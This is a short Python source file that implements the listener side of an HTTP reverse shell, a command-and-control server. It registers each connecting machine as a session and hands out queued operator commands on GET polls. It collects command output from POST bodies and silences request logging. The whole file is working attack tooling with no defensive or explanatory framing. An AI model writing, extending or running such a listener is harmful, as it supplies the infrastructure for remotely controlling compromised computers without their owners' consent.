from http.server import ThreadingHTTPServer,BaseHTTPRequestHandler
import queue
import threading
import time
from collections import defaultdict
NEW_CONNECTION = queue.Queue()
COMMAND_QUEUE = defaultdict(queue.Queue)
RESULT_QUEUE = defaultdict(queue.Queue)
NOTIFY_QUEUE = queue.Queue()
active_sessions = {}
class shell(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def _init_client_queues(self,client_ip):
        if client_ip not in COMMAND_QUEUE:
            COMMAND_QUEUE[client_ip] = queue.Queue()
        if client_ip not in RESULT_QUEUE:
            RESULT_QUEUE[client_ip] = queue.Queue()
    def do_GET(self):
        client_ip,client_port = self.client_address
        if client_ip not in active_sessions:
            active_sessions[client_ip] = time.time()
            NEW_CONNECTION.put((client_ip,client_port))
            NOTIFY_QUEUE.put(f"\n[+] New HTTP reverse shell session from {client_ip}")
        self.send_response(200)
        self.end_headers()
        try:
            cmd = COMMAND_QUEUE[client_ip].get(timeout=2)
        except queue.Empty:
            cmd = ""
        self.wfile.write(cmd.encode())
    def do_POST(self):
        client_ip,client_port = self.client_address
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode("utf-8")
        
        RESULT_QUEUE[client_ip].put(data)
        self.send_response(200)
        self.end_headers()
def Listen(listen_ip: str, listen_port: int):
    host = listen_ip
    port = listen_port
    server = ThreadingHTTPServer((host,port),shell)
    threading.Thread(target=server.serve_forever,daemon=True).start()
    return server
